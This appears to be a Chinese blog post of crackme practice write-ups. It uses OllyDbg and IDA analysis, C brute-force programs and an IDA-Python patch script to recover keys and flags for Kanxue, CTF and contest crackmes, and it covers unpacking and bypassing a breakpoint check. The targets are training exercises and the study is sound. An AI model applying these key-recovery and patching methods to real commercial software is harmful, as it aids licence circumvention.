    <content type="html"><![CDATA[<p>本帖主要对练习Crackme的知识点与突破点进行记录。<a id="more"></a></p><h2 id="翩若惊鸿"><a href="#翩若惊鸿" class="headerlink" title="翩若惊鸿"></a>翩若惊鸿</h2><p>——题目来自看雪题库</p><p>无壳，窗口程序，随便输入一个name与key看程序的反馈。</p><p>有错误提示框，载入OD搜索相应的API，只是很多API序号，应该是MFC42库序号导出的函数。<img src="/2020/07/31/CrackMe/image-20200813120443310.png" alt="image-20200813120443310"></p><p>那现在搜索字符串看看，或使用一个下断点的插件下断，然后查看调用堆栈信息找到API。这里2种方法均可。<img src="/2020/07/31/CrackMe/image-20200813121018755.png" alt="image-20200813121018755"></p><p>向上回溯：<img src="/2020/07/31/CrackMe/image-20200813125708215.png" alt="image-20200813125708215"></p><p>开始在OD中跟进<strong>004015E0</strong>函数，但很多MFC42中导出的函数，跟起来实在恼火。。还是结合ida的F5大法来看：</p><p>一开始逆向分析算法就发现了问题：<img src="/2020/07/31/CrackMe/image-20200813133718116.png" alt="image-20200813133718116"></p><p>上面说明是个死胡同，这里就可以猜测是上面有对函数对402010处代码进行了重写。看前面的代码，果不其然：用了我们输入key的前4位来重写402010处代码，且最后一个校验（检测重写的代码是否正确），校验通过才将重写的代码拷贝到原地址处（0x402010）。<img src="/2020/07/31/CrackMe/image-20200813134136959.png" alt="image-20200813134136959"></p><p>看了看重写与校验的代码，都不复杂，大多数可以直接复制到编译器来作为一个函数使用进而爆破出正确的重写的代码，也就是得到key的前4位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hash_table[<span class="number">0x401</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401500</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; </span><br><span class="line">  <span class="keyword">int</span> *v2; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; </span><br><span class="line"></span><br><span class="line">  hash_table[<span class="number">0x400</span>] = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0x0EDB88320</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = hash_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = v1;</span><br><span class="line">    result = v1;</span><br><span class="line">    v4 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ((result &amp; <span class="number">1</span>) != <span class="number">0</span> ? v0 : <span class="number">0</span>) ^ (result &gt;&gt; <span class="number">1</span>);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    *v2 = result;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_code</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  a3 ^= <span class="number">0xD9EE7A1B</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(result + a1) ^= *((<span class="keyword">char</span> *)&amp;a3 + (result &amp; <span class="number">3</span>));</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401550</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = ~a1; v3 &lt; a3; ++v3 )</span><br><span class="line">    i = hash_table[(<span class="keyword">unsigned</span> __int8)i ^ *(<span class="keyword">unsigned</span> __int8 *)(v3 + a2)] ^ (i &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;<span class="number">0x402010</span><span class="number">-0x402AC0</span>的数据&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0x30303030</span>, e = <span class="number">0x7a7a7a7a</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> decode_data[<span class="number">0xAB0</span>];</span><br><span class="line"><span class="keyword">clock_t</span> start, <span class="built_in">end</span>, total;</span><br><span class="line"> </span><br><span class="line">start = clock();</span><br><span class="line">sub_401500();</span><br><span class="line"><span class="keyword">for</span>(i = s; i &lt;= e; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)&amp;i;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &lt; <span class="number">48</span> || a[<span class="number">1</span>] &lt; <span class="number">48</span> || a[<span class="number">2</span>] &lt; <span class="number">48</span> || a[<span class="number">3</span>] &lt; <span class="number">48</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">65</span>) || (a[<span class="number">1</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">65</span>) || </span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">65</span>) || (a[<span class="number">3</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">65</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">97</span>) || (a[<span class="number">1</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">97</span>) ||</span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">97</span>) || (a[<span class="number">3</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">97</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">122</span> || a[<span class="number">1</span>] &gt; <span class="number">122</span> || a[<span class="number">2</span>] &gt; <span class="number">122</span> || a[<span class="number">3</span>] &gt; <span class="number">122</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(decode_data, ida_chars, <span class="number">0xAB0</span>); </span><br><span class="line">decode_code(decode_data, <span class="number">0xAB0</span>, i);</span><br><span class="line"><span class="keyword">if</span>(sub_401550(<span class="number">0</span>, decode_data, <span class="number">0xAB0</span>) == <span class="number">0xAFFE390F</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">end</span> = clock();</span><br><span class="line">total = (<span class="built_in">end</span>-start)/CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"爆破所用时间：%d分:%d秒\n"</span>, total/<span class="number">60</span>, total%<span class="number">60</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还挺快就得到了答案，主要是要优化去除不可能的字符。<img src="/2020/07/31/CrackMe/image-20200813135150617.png" alt="image-20200813135150617"></p><p>以为到这里应该就结束了，解密出的代码就是一个简单的对key与name判断，算法会很简单。是我想多了🤣，说起这个算法我就是痛，花了好多时间动调猜测一些函数的作用，伪代码实在不好看，也不想看了，汇编就不说了。。</p><p><strong>开始进入解密部分</strong></p><p>写ida-python脚本对<strong>00402010</strong>开始的代码解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x402010</span></span><br><span class="line">s = [<span class="number">89</span>, <span class="number">63</span>, <span class="number">-85</span>, <span class="number">-97</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xab0</span>):</span><br><span class="line">    PatchByte(addr+i, (Byte(addr+i)^s[i&amp;<span class="number">3</span>])&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>来到解密后的函数：<img src="/2020/07/31/CrackMe/image-20200813141328038.png" alt="image-20200813141328038"></p><p>由于最后要name计算出的整数与key计算出的整数相等，而name计算出的整数在OD的内存中十六进制存放，这是可以看到的。而key计算出数据时也是依次得到数据的每一位，然后*16转化一个整数。所以我们只要让key计算出的每一位与name计算后的数据的每一位相等即可。且16进制数只有“0123456789ABCDEF”这些数字，所以可以先得到一张这样的映射表。</p><p>模拟sub_4021A0与sub_402A40函数得到表：<strong>这里我对sub_402A40进行了简化，因为只有0-F的数字，所以只有这几个小正数情况。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i^<span class="number">0x86</span>)<span class="number">-48</span>) == j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#123;%#X"</span>, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", %#X"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144333400.png" alt="image-20200813144333400"></p><p>最后我以计算name为Bxb的key，事先得到了Bxb计算出的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"1D702A7304A94"</span>;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0XB6</span>, <span class="number">0XB7</span>, <span class="number">0XB4</span>, <span class="number">0XB5</span>, <span class="number">0XB2</span>, <span class="number">0XB3</span>, <span class="number">0XB0</span>,</span><br><span class="line">   <span class="number">0XB1</span>, <span class="number">0XBE</span>, <span class="number">0XBF</span>, <span class="number">0XBC</span>, <span class="number">0XBD</span>, <span class="number">0XBA</span>, <span class="number">0XBB</span>, <span class="number">0XB8</span>, <span class="number">0XB9</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"BEEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = s[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt;= <span class="number">48</span> &amp;&amp; temp &lt;= <span class="number">57</span>)</span><br><span class="line">temp -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">temp -= <span class="number">55</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(flag+i*<span class="number">2</span>+<span class="number">4</span>, <span class="string">"%X"</span>, a[temp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144918630.png" alt="image-20200813144918630"></p><p>做到这，真的不想再看这个题了，我就想不通，伪代码怎么如此绕，key的生成算法都动调了好多遍。所以那个name计算的算法也真的不想看了。。。进而不能得到注册机。</p><p>其次这个题，对要改变数据的内存地址，传参都是使用ecx传参指向this*。</p><h2 id="乘风破浪"><a href="#乘风破浪" class="headerlink" title="乘风破浪"></a>乘风破浪</h2><p>——题目来自看雪题库</p><p>题目难点：题目开始启动双线程，线程之间以事件通讯。对于不清楚双线程，自然会有很多疑问，跟踪程序起来也会困难一些。</p><p>首先以不知道双线程的角度来跟踪程序：</p><p>查看程序中的获取控件文本内容的API，搜索发现没有GetDlgItemText，但是有GetWindowTextLenthW与GetWindowTextW。双击进入。<img src="/2020/07/31/CrackMe/image-20200731174647264.png" alt="image-20200731174647264"></p><p>由于后面肯定会对输入数据进行验证处理，所以在数据窗口对该地址下硬件访问断点, F9运行断下后：<img src="/2020/07/31/CrackMe/image-20200731175348583.png" alt="image-20200731175348583"></p><p>上面汇编代码很简单，就是比较输入的name与key是否相等且最后以这个来确定返回值，尝试打开程序看验证一下，不对的。继续跟着程序返回：既然上一个验证函数是错误的，下面这个箭头所指跳转就不能实现才正确。<img src="/2020/07/31/CrackMe/image-20200731175649160.png" alt="image-20200731175649160"></p><p>修改标志寄存器后，单步分析401299以下的代码，很多无用的跳转，还是简单，一个验证：name与key的逆序是否相等且长度要不小于8。再次打开程序验证一下，正确。所以程序的key只要是name的逆序就正确。</p><p>当然我对程序还是有很多疑问，从出题人的帖子看到说是双线程。</p><p>开始去学习多线程的知识，觉得讲的很清楚的一个帖子：<a href="https://blog.csdn.net/LL596214569/article/details/89163734" target="_blank" rel="noopener">https://blog.csdn.net/LL596214569/article/details/89163734</a></p><p>了解多线程后，理解这个程序就很好了，首先是看是否有创建事件，查找API：CreatEvent。在创建线程API：CreatThread下断点，从CreatThread找到线程函数的地址。接着就是下图中的函数：<img src="/2020/07/31/CrackMe/image-20200731182155636.png" alt="image-20200731182155636"></p><p><strong>最后</strong>，所以程序的整体逻辑就是首先创建2个事件，再创建2个线程，2个线程函数都有WaitForSingleObject函数一直等待事件的信号后再向下继续执行。而我们输入name与key后点击Ok就会发生按钮事件，触发OS向程序发现消息，然后执行SetEvent函数将指定线程的WaitForSingleObject函数等待的指定事件设置为有信号状态。<img src="/2020/07/31/CrackMe/image-20200731183904491.png" alt="image-20200731183904491"></p><p>接下来在该线程进行验证name与key，如果验证通过的话设置另外一个线程等待的指定的事件设置为有信号状态，另一个线程开始执行显示提示正确的对话框的代码。<strong>简而言之：一个线程负责验证，一个线程负责显示。</strong></p><h2 id="渐入佳境"><a href="#渐入佳境" class="headerlink" title="渐入佳境"></a>渐入佳境</h2><p>——题目来自看雪题库</p><p>运行一下程序，有错误输入提示框。</p><p>上手直接找MessageBox，到达代码处向上分析：所以我们要向上回溯找到对ebp+c赋值处。<img src="/2020/07/31/CrackMe/image-20200801132230026.png" alt="image-20200801132230026"></p><p>继续向上回溯可以看到：<img src="/2020/07/31/CrackMe/image-20200801132543497.png" alt="image-20200801132543497"></p><p>所以下面跳转的地方就是验证过程：算法很简单。<img src="/2020/07/31/CrackMe/image-20200801132628646.png" alt="image-20200801132628646"></p><h2 id="CrackMe01"><a href="#CrackMe01" class="headerlink" title="CrackMe01"></a>CrackMe01</h2><p>——题目来自“百度杯”CTF比赛十一月场</p><p>还是上手载入OD，找一下获取输入文本相关的API：<img src="/2020/07/31/CrackMe/image-20200805164512873.png" alt="image-20200805164512873"></p><p>开始只看到第一个，下断后在程序输入内容后却没有断下。还以为又是多线程，分析一波后确实创建了一个线程，但不对。后面才在第二个GetWindowTextW下断，输入内容后程序断下。</p><p>单步跟踪后发现，将输入的字符传到另外一个内存空间存储后，再调用PostMessageW函数将输入字符传给指定句柄的窗口。这里打开ida看下：<img src="/2020/07/31/CrackMe/image-20200805170315887.png" alt="image-20200805170315887"></p><p>之后可以直接查找默认消息处理函数：DefWindowProc 来定位处理输入字符的代码处。</p><p>这里看PostMessage函数第一个参数的交叉引用来定位目的代码。因为hWnd是接收消息的窗口句柄，我们看个窗口的句柄赋值给了hWnd。hWnd是全局变量。</p><p>从交叉引用来到下面的函数：<img src="/2020/07/31/CrackMe/image-20200805172125636.png" alt="image-20200805172125636"></p><p>可以看到，使用了WinClass定义了一个窗口的类，对每个属性赋值后使用RegisterClassW来注册窗口，最后通过CreatWindowExW将该窗口实例化，并此窗口句柄赋值给Hwnd。所以我们输入的字符串是发送给了这个窗口。</p><p>另外，WndClass中的成员lpfnWndProc指向一个回调函数，是窗体的消息处理函数。<strong>它接受到PostMessageW发送来的消息后即调用。</strong></p><p>进入该窗口消息处理函数：<img src="/2020/07/31/CrackMe/image-20200805172955592.png" alt="image-20200805172955592"></p><p>从上面函数知道，虽然不知道输入的具体字符串是什么，但是可以爆破出累加和，且不大于17*122 = 2074（因为输入字符长度&lt;= 17）。得到累加和我们就能知道，窗口显示出的是什么内容了。</p><p>写程序收工：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xF5</span>, <span class="number">0x04</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xE9</span>, <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x04</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2074</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i&amp;<span class="number">0xf00</span>) == <span class="number">1024</span>) &amp;&amp; ((i&amp;<span class="number">0xf0</span>) == <span class="number">0xb0</span>) &amp;&amp; ((i&amp;<span class="number">6</span>) == <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">44</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[k++] = *(<span class="keyword">short</span> <span class="keyword">int</span> *)&amp;ida_chars[j]^i; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag), k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(flag, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终得到：即第一个满足。<img src="/2020/07/31/CrackMe/image-20200805173523092.png" alt="image-20200805173523092"></p><h2 id="dame"><a href="#dame" class="headerlink" title="dame"></a>dame</h2><p>——题目来自DAMN’s Official joining Contest（是一个机构的加入测试，将程序指定破解并写出注册机）</p><p>题目链接：<a href="https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog</a> 提取码：h0z9</p><p>要求：大按钮和标题显示未锁定的消息并且程序说按钮被按下时未锁定与注册机的编写。<img src="/2020/07/31/CrackMe/image-20200806181244476.png" alt="image-20200806181244476"></p><p>载入OD发现有壳，直接堆栈平衡原理把壳带走，然后dump出无壳文件。</p><p>由于我们要修改对话框模块上的内容，所以首先找到创建对话框函数。OD载入在程序入口点即可看到：DialogBoxParamA<img src="/2020/07/31/CrackMe/image-20200806181904819.png" alt="image-20200806181904819"></p><p>可以看到上图中的对话框过程函数的起始地址：<strong>401045</strong>，该处代码好像没有识别出来，且下断有提示并且执行很奇怪。载入ida中看看：<img src="/2020/07/31/CrackMe/image-20200806182148079.png" alt="image-20200806182148079"></p><p>所以enter在OD中没有识别出来，且401035-401045确实数据，401049才是代码开始，所以返回OD进行处理，注意不能nop，因为数据在后面有使用到，直接下断401049。</p><p>接下来，不断单步调试知道，DialogProc函数根据不同的消息做出相应的响应。首先创建整个对话框模板，然后不断载入各种控件。<img src="/2020/07/31/CrackMe/image-20200806182822916.png" alt="image-20200806182822916"></p><p>OD调试后，在IDA中看指定代码段：可以看到dword_402313处的值决定了控件的显示内容和样式。<img src="/2020/07/31/CrackMe/image-20200806183539623.png" alt="image-20200806183539623"></p><p>找到dword_402313赋值处：是对程序部分的代码的校验，检测是否下断点。<img src="/2020/07/31/CrackMe/image-20200806183725134.png" alt="image-20200806183725134"></p><p>虽然知道了dowrd_402313处的值影响对话框的显示，但是什么样的值才能达到我们的目的呢，回到OD动调。<img src="/2020/07/31/CrackMe/image-20200806185407720.png" alt="image-20200806185407720"></p><p>由于程序中存在代码校验，多次调试发现，当下断后[402313] = 1，为下断点[402313] = 0。 继续调试：<img src="/2020/07/31/CrackMe/image-20200806185813389.png" alt="image-20200806185813389"></p><p>到这里就清楚了，[402313]的值还决定了显示字符串的偏移位置，当[402313] = 1时，字符串为：DAMN’s TryMe -CRACKED! 而它后面一个字符串就是：UNLOCKED！所以推出：[402313]的值要等于2。</p><p>重新载入，找到合适位置在内存窗口修改[402313]的值为2，然后运行。<img src="/2020/07/31/CrackMe/image-20200806190419665.png" 